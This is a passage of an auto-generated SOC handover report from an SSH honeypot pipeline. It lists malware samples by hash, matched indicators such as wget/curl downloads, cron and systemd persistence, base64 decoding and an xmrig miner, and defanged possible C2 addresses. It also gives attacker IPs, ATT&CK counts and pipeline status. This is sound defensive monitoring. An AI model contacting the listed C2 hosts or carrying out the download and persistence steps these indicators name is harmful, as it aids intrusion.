- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `180.93.245[.]203` | VN | Saigon Postel Corporation | **100** ⚠️ | 45 |
| `120.141.22[.]254` | MY | TM TECHNOLOGY SERVICES SDN. BHD. | **100** ⚠️ | 1 |
| `103.84.142[.]100` | ID | PT. Cemerlang Multimedia | **100** ⚠️ | 0 |
| `199.165.159[.]177` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 15 |
| `69.6.207[.]8` | MX | Newfold Digital, Inc. | **100** ⚠️ | 5 |
| `41.219.149[.]78` | NG | Netcom Africa Limited | **100** ⚠️ | 5 |
| `61.76.97[.]173` | KR | Korea Telecom | **100** ⚠️ | 16 |
| `77.90.185[.]29` | LT | Limited Network LTD | **100** ⚠️ | 5 |
| `103.86.52[.]211` | PK | Optix Pakistan (Pvt.) Limited | **100** ⚠️ | 14 |
| `103.29.70[.]204` | JP | Akamai Connected Cloud / Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 64 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 54 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 2 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 110 cases |
| Tool 34  | Credential Extractor        | ✅ 158 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 89 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (20.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 50 priority case(s) shown individually · 37 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-13T04:02:41Z_
